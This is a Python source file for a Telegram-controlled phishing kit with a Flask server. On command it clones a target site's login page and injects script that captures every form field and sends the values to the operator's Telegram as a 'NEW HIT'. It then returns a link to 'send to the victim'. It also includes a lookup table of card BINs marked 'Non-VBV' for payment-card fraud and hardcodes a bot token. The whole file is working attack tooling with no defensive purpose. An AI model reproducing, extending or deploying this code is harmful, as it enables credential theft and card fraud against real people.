import os
import re
import threading
import requests
from bs4 import BeautifulSoup
from flask import Flask, request, render_template_string
import telebot

TOKEN = '9092673646:AAFyrSSdYznnUAOlC1jR_rZT2-3hsbYkvNI'
ADMIN_ID = 8172701890

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)
SESSIONS = {}

BIN_DB = {
    "406632": {"processor": "DCS", "vbv": "Non-VBV"},
    "449497": {"processor": "DCS", "vbv": "Non-VBV"},
    "415823": {"processor": "DCS", "vbv": "Non-VBV"},
    "463092": {"processor": "Valet", "vbv": "Non-VBV"},
    "514616": {"processor": "Valet", "vbv": "Non-VBV"},
    "439348": {"processor": "DX", "vbv": "Non-VBV"},
    "437795": {"processor": "DCS", "vbv": "Non-VBV"},
    "470541": {"processor": "DCS", "vbv": "Non-VBV"},
    "429123": {"processor": "DCS", "vbv": "Non-VBV"},
    "478820": {"processor": "DCS", "vbv": "Non-VBV"},
    "476546": {"processor": "Valet", "vbv": "Non-VBV"}
}

@app.route('/<slug>', methods=['GET'])
def serve_page(slug):
    if slug not in SESSIONS:
        return "Link expired or invalid.", 404
    return render_template_string(SESSIONS[slug]['html'])

@app.route('/capture/<slug>', methods=['POST'])
def capture(slug):
    data = request.json
    if not data: return "Error", 400
    
    msg = f"🚨 <b>NEW HIT</b> 🚨\n\n<b>Target:</b> {SESSIONS[slug]['url']}\n\n"
    for key, value in data.items():
        msg += f"<b>{key}:</b> <code>{value}</code>\n"
    
    bot.send_message(ADMIN_ID, msg, parse_mode='HTML')
    return "OK", 200

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.chat.id != ADMIN_ID: return
    bot.reply_to(message, "Commands:\n`/bin 449497` - Check a BIN\n`https://target.com` - Clone a login page")

@bot.message_handler(commands=['bin'])
def check_bin(message):
    if message.chat.id != ADMIN_ID: return
    try:
        bin_num = message.text.split(' ')[1].strip()[:8]
    except IndexError:
        bot.reply_to(message, "Format: `/bin 449497`", parse_mode='Markdown')
        return

    bot.reply_to(message, f"🔍 Checking BIN: `{bin_num}`...", parse_mode='Markdown')
    
    processor = "Unknown"
    vbv = "Requires Auth Test"
    for known_bin, data in BIN_DB.items():
        if bin_num.startswith(known_bin):
            processor = data["processor"]
            vbv = data["vbv"]
            break

    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_num}", headers={'Accept-Version': '3'}, timeout=5)
        data = r.json()
        bank = data.get('bank', {}).get('name', 'Unknown')
        brand = data.get('scheme', 'Unknown').upper()
        country = data.get('country', {}).get('name', 'Unknown')
    except:
        bank = "Unknown"
        brand = "Unknown"
        country = "Unknown"

    reply = f"💳 <b>BIN:</b> <code>{bin_num}</code>\n"
    reply += f"🏦 <b>Bank:</b> {bank}\n"
    reply += f"💠 <b>Brand:</b> {brand}\n"
    reply += f"🌍 <b>Country:</b> {country}\n"
    reply += f"⚙️ <b>Processor:</b> {processor}\n"
    reply += f"🛡️ <b>VBV:</b> <code>{vbv}</code>"
    
    bot.reply_to(message, reply, parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text and message.text.startswith('http'))
def clone_site(message):
    if message.chat.id != ADMIN_ID: return
    url = message.text
    bot.reply_to(message, f"Scraping {url}...")
    
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)'}
        r = requests.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        slug = os.urandom(4).hex()

        script = f"""
        <script>
        document.addEventListener('submit', function(e) {{
            e.preventDefault();
            var data = {{}};
            e.target.querySelectorAll('input').forEach(function(inp) {{
                if(inp.value) data[inp.name || inp.id || inp.placeholder || 'input'] = inp.value;
            }});
            
            fetch('/capture/{slug}', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify(data)
            }}).then(function() {{
                alert('Processing... Please wait.');
                window.location.href = '{url}';
            }});
        }});
        </script>
        """
        
        if soup.body:
            soup.body.append(BeautifulSoup(script, 'html.parser'))
        
        base_url = re.match(r'(https?://[^/]+)', url).group(0)
        for tag in soup.find_all(['link', 'script', 'img']):
            if tag.get('href') and tag['href'].startswith('/'):
                tag['href'] = base_url + tag['href']
            if tag.get('src') and tag['src'].startswith('/'):
                tag['src'] = base_url + tag['src']

        SESSIONS[slug] = {'html': str(soup), 'url': url}
        
        host = os.environ.get('RENDER_EXTERNAL_URL', 'http://localhost:8080')
        
        bot.reply_to(message, f"✅ <b>Clone Live!</b>\n\n<code>{host}/{slug}</code>\n\nSend this to the victim.", parse_mode='HTML')

    except Exception as e:
        bot.reply_to(message, f"❌ Failed: {e}")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False), daemon=True).start()
    
    print("Bot is running...")
    bot.infinity_polling()
